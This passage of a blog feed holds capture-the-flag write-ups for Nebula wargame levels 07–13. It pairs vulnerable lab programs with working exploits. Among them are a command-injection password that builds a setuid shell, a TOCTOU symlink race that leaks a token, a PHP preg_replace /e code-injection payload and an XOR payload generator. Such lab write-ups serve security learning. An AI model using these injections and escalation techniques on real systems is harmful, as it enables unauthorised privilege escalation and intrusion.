(gdb) continue
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 31018) exited with code 063]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now &lt;em&gt;su&lt;/em&gt; to &lt;em&gt;flag13&lt;/em&gt; with the token.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 12</title>
      <link>/post/2014-01-26-nebula-level12/</link>
      <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level12/</guid>
      <description>

&lt;h3 id=&#34;about:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level12&lt;/em&gt; account with the password &lt;em&gt;level12&lt;/em&gt;. Files for this level can be found in /home/flag12.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Source code&lt;/h3&gt;

&lt;p&gt;``` lua /home/flag12/flag12.lua
local socketlocal socket = require(&amp;ldquo;socket&amp;rdquo;)
local server = assert(socket.bind(&amp;ldquo;127.0.0.1&amp;rdquo;, 50001))&lt;/p&gt;

&lt;p&gt;function hash(password)
  prog = io.popen(&amp;ldquo;echo &amp;ldquo;..password..&amp;rdquo; | sha1sum&amp;rdquo;, &amp;ldquo;r&amp;rdquo;)
  data = prog:read(&amp;rdquo;*all&amp;rdquo;)
  prog:close()&lt;/p&gt;

&lt;p&gt;data = string.sub(data, 1, 40)&lt;/p&gt;

&lt;p&gt;return data
end&lt;/p&gt;

&lt;p&gt;while 1 do
  local client = server:accept()
  client:send(&amp;ldquo;Password: &amp;ldquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print(&amp;ldquo;trying &amp;rdquo; .. line) &amp;ndash; log from where ;\
    local h = hash(line)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
  client:send(&amp;quot;Better luck next time\n&amp;quot;);
else
  client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;end&lt;/p&gt;

&lt;p&gt;client:close()
end&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;

### Solution 

`prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)` this line of code in *hash()* function try to calc the hash of the password, but we can execute any command with a well structed *password*. 

Write a simple Ruby script to send command to server, here I construct a *password* to make the server build a *drop.c* file into directory /home/flag12.

``` ruby
require &#39;socket&#39;

server = TCPSocket.open(&amp;quot;127.0.0.1&amp;quot;, 50001)
server.puts(&amp;quot;hello &amp;amp;&amp;amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;amp;&amp;amp; chmod 777 /home/flag12/flag12 &amp;amp;&amp;amp; chmod +s /home/flag12/flag12 &amp;amp;&amp;amp; echo hello &amp;quot;)
ret = server.gets.chomp
puts &amp;quot;#{ret}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remenber the piece of C code we used to drop privilege? Here it is again:&lt;/p&gt;

&lt;p&gt;``` c /tmp/drop.c
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;&lt;/p&gt;

&lt;p&gt;int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();&lt;/p&gt;

&lt;p&gt;setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);&lt;/p&gt;

&lt;p&gt;execv(&amp;ldquo;/bin/bash&amp;rdquo;, NULL);
}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
Run the Ruby script, I got

``` bash
level12@nebula:~$ ruby client.rb
Password: Better luck next time
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;flag12@nebula:~$ ll /home/flag12
total 14
drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is the executable &lt;em&gt;flag12&lt;/em&gt; with Set-User-ID bit, run it and a bash with &lt;em&gt;flag12&lt;/em&gt; user privilege will show up!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 11</title>
      <link>/post/2014-01-26-nebula-level11/</link>
      <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level11/</guid>
      <description>

&lt;h3 id=&#34;about:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;/home/flag11/flag11&lt;/em&gt; binary processes standard input and executes a shell command.&lt;/p&gt;

&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level11&lt;/em&gt; account with the password &lt;em&gt;level11&lt;/em&gt; . Files for this level can be found in /home/flag11.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
	char *tmp;
	int pid;
	int fd;

	srandom(time(NULL));

	tmp = getenv(&amp;quot;TEMP&amp;quot;);
	pid = getpid();

	asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
			 &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10), 
			 &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
			 &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

	fd = open(*path, O_CREAT|O_RDWR, 0600);
	unlink(*path);
	return fd;
}

void process(char *buffer, int length)
{
	unsigned int key;
	int i;

	key = length &amp;amp; 0xff;

	for(i = 0; i &amp;lt; length; i++) {
		buffer[i] ^= key;
		key -= buffer[i];
	}

	system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
	char line[256];
	char buf[1024];
	char *mem;
	int length;
	int fd;
	char *path;

	if(fgets(line, sizeof(line), stdin) == NULL) {
		errx(1, &amp;quot;reading from stdin&amp;quot;);
	}

	if(strncmp(line, CL, strlen(CL)) != 0) {
		errx(1, &amp;quot;invalid header&amp;quot;);
	}

	length = atoi(line + strlen(CL));

	if(length &amp;lt; sizeof(buf)) {
		if(fread(buf, length, 1, stdin) != length) {
			err(1, &amp;quot;fread length&amp;quot;);
		}
		process(buf, length);
	} else {
		int blue = length;
		int pink;

		fd = getrand(&amp;amp;path);

		while(blue &amp;gt; 0) {
			printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

			pink = fread(buf, 1, sizeof(buf), stdin);
			printf(&amp;quot;pink = %d\n&amp;quot;, pink);

			if(pink &amp;lt;= 0) {
				err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
			}
			write(fd, buf, pink);

			blue -= pink;
		}  

		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
		if(mem == MAP_FAILED) {
			err(1, &amp;quot;mmap&amp;quot;);
		}
		process(mem, length);
	}
}

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;solution:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;In fact I have not passed this one yet, I have met a &lt;strong&gt;problem&lt;/strong&gt; which I will talk about later,
right now I just want to explain my &lt;strong&gt;idea&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The overall function of the program &lt;em&gt;/home/flag11/flag11&lt;/em&gt; is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.&lt;/p&gt;

&lt;p&gt;More specifically, &lt;em&gt;flag11&lt;/em&gt; requires that the input should match the following pattern:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Content-Length: %d
Content...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;here, depends on the content length &lt;em&gt;%d&lt;/em&gt;, &lt;em&gt;flag11&lt;/em&gt; will go into two branches, if &lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;,
&lt;em&gt;flag11&lt;/em&gt; would read the content directly into &lt;em&gt;buf&lt;/em&gt; and pass it to &lt;em&gt;process&lt;/em&gt;.
Note that it is required that &lt;code&gt;fread(buf, length, 1, stdin) == length&lt;/code&gt;, so we know that &lt;em&gt;length&lt;/em&gt; must be 1.
(refer to &lt;a href=&#34;http://linux.die.net/man/3/fread&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;fread()&lt;/em&gt; for details)&lt;/p&gt;

&lt;p&gt;Otherwise if &lt;em&gt;length&lt;/em&gt; is any number larger or equal to 1024, &lt;em&gt;flag11&lt;/em&gt; would buffer the input into a file first,
then pass the content of the file to &lt;em&gt;process&lt;/em&gt;. I think these are the TWO WAYS mentioned in the description.&lt;/p&gt;

&lt;p&gt;The function &lt;em&gt;process&lt;/em&gt; would do some calculation on &lt;em&gt;buf&lt;/em&gt; based on its content using XOR operation.
So if we want to executes some commands like &lt;em&gt;/bin/getflag&lt;/em&gt;, we need to do some reverse calculation and find out
what the origin &lt;em&gt;buf&lt;/em&gt; would be like.&lt;/p&gt;

&lt;h4 id=&#34;way-one:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way One&lt;/h4&gt;

&lt;p&gt;My first thought was that I could make &lt;em&gt;length&lt;/em&gt; to be 1, and make a soft link to &lt;em&gt;/bin/getflag&lt;/em&gt;, then leverage
&lt;em&gt;flag11&lt;/em&gt; to execute this soft link. I first create a file &lt;em&gt;f.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;``` text f.txt
Content-Length: 1
f&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
You can expect that `&#39;f&#39; ^ (length&amp;amp;&amp;amp;0xff) == &#39;g&#39;`, where *length* is 1.
Then I would execute the following

``` bash
level11@nebula:~$ ln -s /bin/getflag /tmp/g
level11@nebula:~$ export PATH=/tmp/:$PATH


level11@nebula:~$ /home/flag11/flag11 &amp;lt; /home/level11/f.txt
sh: gP,: command not found

level11@nebula:/home/flag11$ ./flag11 &amp;lt; /home/level11/f.txt
sh: $&#39;g\240\030&#39;: command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Failed. Since each time the output command are different (but the first char &lt;em&gt;g&lt;/em&gt; is correct),
it must be that &lt;em&gt;buf&lt;/em&gt; actually do not have a string terminator &amp;lsquo;\0&amp;rsquo;,
so I tried a few times and finally&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ../flag11/flag11 &amp;lt; ls.txt
getflag is executing on a non-flag account, this doesn&#39;t count
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well&amp;hellip;here is the &lt;strong&gt;problem&lt;/strong&gt;, the &lt;em&gt;system()&lt;/em&gt; call would not drop privilege on my system&amp;hellip;&lt;/p&gt;

&lt;p&gt;I read the &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;system()&lt;/em&gt; carefully, it mentioned that&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also did some google and find &lt;a href=&#34;http://www.cplusplus.com/forum/articles/11153/&#34;&gt;this&lt;/a&gt; thread on cplusplus
and &lt;a href=&#34;http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges&#34;&gt;this&lt;/a&gt;
question on Stackoverflow ot be useful. It is said that &lt;em&gt;system()&lt;/em&gt; itself would not drop privileges,
but Bash 2 would, and my bash is version 4, so I think this meybe the reason.&lt;/p&gt;

&lt;p&gt;I came across an interesting solution for this routine by &lt;a href=&#34;http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html&#34;&gt;Reno Robert&lt;/a&gt;, who leveraged &lt;em&gt;LD_PRELOAD&lt;/em&gt; to initialize the buffer.&lt;/p&gt;

&lt;h4 id=&#34;way-two:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way Two&lt;/h4&gt;

&lt;p&gt;Anyway, before I realized this problem, I did do something through the second way,
to get what the input should be from the output command, I wrote another program &lt;em&gt;gen.c&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;``` c gen.c
void process(char *buffer, int length)
{
        unsigned int key;
        int i;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    key = length &amp;amp; 0xff;

    for(i = 0; i &amp;lt; length; i++) {
            buffer[i] ^= key;
            key -= (key ^ buffer[i]);
    }
    //system(buffer);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;main() {
  char* cmd = &amp;ldquo;getflag&amp;rdquo;;
  char buf[1024];
  int len = strlen(cmd);
  memset((void *)buf, 0, 1024&amp;gt;&amp;gt;2);
  strncpy(buf, cmd, len+1);&lt;/p&gt;

&lt;p&gt;process(buf, 1024);
  printf(&amp;ldquo;Content-Length: 1024\n&amp;rdquo;);
  fwrite(buf, 1024, 1, stdout);
}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
and after compiling into an executable *gen*, I tried to trigger the exploit like this

``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn&#39;t count

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;same failure, and after that I changed the &lt;em&gt;cmd&lt;/em&gt; from &amp;ldquo;getflag&amp;rdquo; to &amp;ldquo;id&amp;rdquo; ,
and the output is&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
uid=1012(level11) gid=1012(level11) groups=1012(level11)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No privilege dropped )=&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 10</title>
      <link>/post/2014-01-25-nebula-level10/</link>
      <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
      
      <guid>/post/2014-01-25-nebula-level10/</guid>
      <description>

&lt;h3 id=&#34;about:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The setuid binary at &lt;em&gt;/home/flag10/flag10&lt;/em&gt; binary will upload any file given, as long as it meets the requirements of the &lt;em&gt;access()&lt;/em&gt; system call.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level10&lt;/em&gt; account with the password &lt;em&gt;level10&lt;/em&gt;. Files for this level can be found in /home/flag10.&lt;/p&gt;

&lt;h3 id=&#34;source-code:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;Source Code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];
  	
    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);
  	
    fd = socket(AF_INET, SOCK_STREAM, 0);
  	
    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);
  	
    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
  	
#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE
  
    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);
  	
    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
      exit(EXIT_FAILURE);
    }
  	
    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
      exit(EXIT_FAILURE);
    }
  	
    write(fd, buffer, rc);
  	
    printf(&amp;quot;wrote file!\n&amp;quot;);
  } else {
    printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;p&gt;There at two files in the directory /home/flag10, &lt;em&gt;flag10&lt;/em&gt; and &lt;em&gt;token&lt;/em&gt;. The source code of executable &lt;em&gt;flag10&lt;/em&gt; in shown above, and &lt;em&gt;token&lt;/em&gt; contains the password of user &lt;em&gt;flag10&lt;/em&gt;. The goal is to read the content of &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The attack comes from a common bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use&#34;&gt;Time of check to time of use&lt;/a&gt;, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;pass &lt;em&gt;/home/level10/token&lt;/em&gt; whick links to a real user(&lt;em&gt;level10&lt;/em&gt;) readable file &lt;em&gt;/home/level10/test&lt;/em&gt; to the program as &lt;code&gt;argv[1]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;/home/flag10/flag10&lt;/em&gt; checks whether this file is accessable at line 24(with the result true)&lt;/li&gt;
&lt;li&gt;modify the file to link to &lt;em&gt;/home/flag10/token&lt;/em&gt; when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; is executing code between line 24 and line 54&lt;/li&gt;
&lt;li&gt;when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; reads the file at line 54, it reads &lt;em&gt;/home/flag10/token&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the &lt;em&gt;flag10&lt;/em&gt; program will send a banner before actually read the file(line 46), this leaves me some time to make some change!&lt;/p&gt;

&lt;p&gt;Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file &lt;em&gt;/home/level10/token&lt;/em&gt; immediately after the server accepts a connection from the client, I wrote this server code in Ruby:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;

server = TCPServer.new(18211)
loop {
    client = server.accept
    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
    while msg = client.gets
        puts &amp;quot;RECV: #{msg}&amp;quot;
    end
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the server was started, I triggered the vulnerability with the following command&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ /home/flag10/flag10 ~/token 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that the symbolic file &lt;em&gt;~/token&lt;/em&gt; must exist and point to a file that is readable by user &lt;em&gt;level10&lt;/em&gt; before the program &lt;em&gt;flag10&lt;/em&gt; is executed.&lt;/p&gt;

&lt;p&gt;The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: hello world

level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 09</title>
      <link>/post/2014-01-24-nebula-level09/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:40 +0800</pubDate>
      
      <guid>/post/2014-01-24-nebula-level09/</guid>
      <description>

&lt;h3 id=&#34;about:e4424096463f5985d9de53dfe658d56b&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There&amp;rsquo;s a C setuid wrapper for some vulnerable PHP code&amp;hellip;&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level09&lt;/em&gt; account with the password &lt;em&gt;level09&lt;/em&gt;. Files for this level can be found in /home/flag09.&lt;/p&gt;

&lt;h3 id=&#34;source-code:e4424096463f5985d9de53dfe658d56b&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:e4424096463f5985d9de53dfe658d56b&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;This php snippet does the following things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;read the content of file $argv[1]&lt;/li&gt;
&lt;li&gt;replace all the text paterns liket &amp;ldquo;[email hjc@hanjc.me]&amp;rdquo; with &amp;ldquo;hjc AT hanjc dot me&amp;rdquo;&lt;/li&gt;
&lt;li&gt;replace all the &amp;ldquo;[&amp;rdquo; with &amp;ldquo;&amp;lt;&amp;ldquo;, replace &amp;ldquo;]&amp;rdquo; with &amp;ldquo;&amp;gt;&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function &lt;code&gt;preg_replace&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Google this function and I found many useful thing. There is a &lt;a href=&#34;https://bugs.php.net/bug.php?id=35960&#34;&gt;bug report&lt;/a&gt; related to this function, and another &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;article&lt;/a&gt; explains in detail about how to exploit this vulnerability.&lt;/p&gt;

&lt;p&gt;In general, the vulnerability exists when a &amp;ldquo;\e&amp;rdquo; is set in the PCRE expression provided to the &lt;code&gt;preg_replace&lt;/code&gt; function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned &lt;a href=&#34;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;here&lt;/a&gt;. This link also provides an input string tha could exploit this function, which is&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;h1&amp;gt;{${eval($_GET[php_code])}}&amp;lt;/h1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As my goal is to run system command with this function, I modified this attack string to be&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${system(&#39;touch /home/flag09/test&#39;)}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Save this string in /tmp/txt, and run the following command&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ /home/flag09/flag09 /tmp/txt noused
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument &lt;code&gt;$use_me&lt;/code&gt; to function &lt;code&gt;markup&lt;/code&gt; that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${system($use_me)}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I could run any command with&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ /home/flag09/flag09 /tmp/txt &amp;quot;any command&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 08</title>
      <link>/post/2014-01-24-nebula-level08/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:31 +0800</pubDate>
      
      <guid>/post/2014-01-24-nebula-level08/</guid>
      <description>

&lt;h3 id=&#34;about:5292a1ddbf8ffdedd6d2a347c8ea1260&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level08&lt;/em&gt; account with the password &lt;em&gt;level08&lt;/em&gt;. Files for this level can be found in /home/flag08.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:5292a1ddbf8ffdedd6d2a347c8ea1260&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;用*level08*登录之后回看到一个名为*capture.pcap*的文件，记录了一次抓包的结果。把这个文件scp出来之后分析，中间有一处显示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Password: backdoor...00Rm8.ate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看样子是*flag08*用户的密码，不过用过十六进制编辑器的小伙伴们都知道，&amp;rdquo;.&amp;ldquo;可能是任何空白字符，不能简单的认为密码就是“backdoor&amp;hellip;00Rm8.ate”。查看这部分的十六进制，发现“.”对应的是0x7f，查了一下&lt;a href=&#34;http://www.asciitable.com/&#34;&gt;ASCII码表&lt;/a&gt;发现0x7f是DEL，也就是删除键，所以实际的密码应该是“backd00Rm8.ate”。&lt;/p&gt;

&lt;p&gt;还挺会玩儿的，拿0替代了o……&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 07</title>
      <link>/post/2014-01-13-nebula-level07/</link>
      <pubDate>Mon, 13 Jan 2014 15:49:10 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level07/</guid>
      <description>

&lt;h3 id=&#34;about:6e8e879d12e150811eeb68f592dacf76&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;flag07&lt;/em&gt; user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level07&lt;/em&gt; account with the password &lt;em&gt;level07&lt;/em&gt;. Files for this level can be found in /home/flag07.&lt;/p&gt;

&lt;h3 id=&#34;source-code:6e8e879d12e150811eeb68f592dacf76&#34;&gt;Source Code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

